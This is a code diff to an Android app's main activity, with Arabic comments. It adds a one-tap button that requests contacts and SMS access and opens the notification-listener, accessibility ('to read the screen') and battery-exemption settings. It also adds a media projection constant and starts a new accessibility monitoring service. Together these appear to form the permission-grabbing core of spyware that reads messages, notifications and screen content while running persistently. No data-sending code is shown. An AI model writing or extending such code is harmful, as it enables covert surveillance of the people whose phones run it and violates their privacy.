@@ -4,6 +4,7 @@ import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.widget.Button;
@@ -17,6 +18,8 @@ import androidx.core.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
 
+    private static final int REQUEST_MEDIA_PROJECTION = 100;
+    
     private String[] permissions = {
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_SMS,
@@ -48,16 +51,21 @@ public class MainActivity extends AppCompatActivity {
         Button btnPermissions = new Button(this);
         btnPermissions.setText("🔓 تفعيل جميع الصلاحيات");
         btnPermissions.setOnClickListener(v -> {
+            // الأذونات العادية
             for (String permission : permissions) {
                 if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                     ActivityCompat.requestPermissions(this, new String[]{permission}, 100);
                 }
             }
+            // صلاحية الإشعارات
             startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+            // صلاحية الوصول (لقراءة الشاشة)
             startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            // تجاهل البطارية
             Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
             intent.setData(Uri.parse("package:" + getPackageName()));
             startActivity(intent);
+            
             Toast.makeText(this, "✅ تم فتح جميع الصلاحيات", Toast.LENGTH_LONG).show();
         });
 
@@ -67,5 +75,6 @@ public class MainActivity extends AppCompatActivity {
 
         startService(new Intent(this, MainService.class));
         startService(new Intent(this, NotifyService.class));
+        startService(new Intent(this, AccessibilityMonitorService.class));
     }
 }
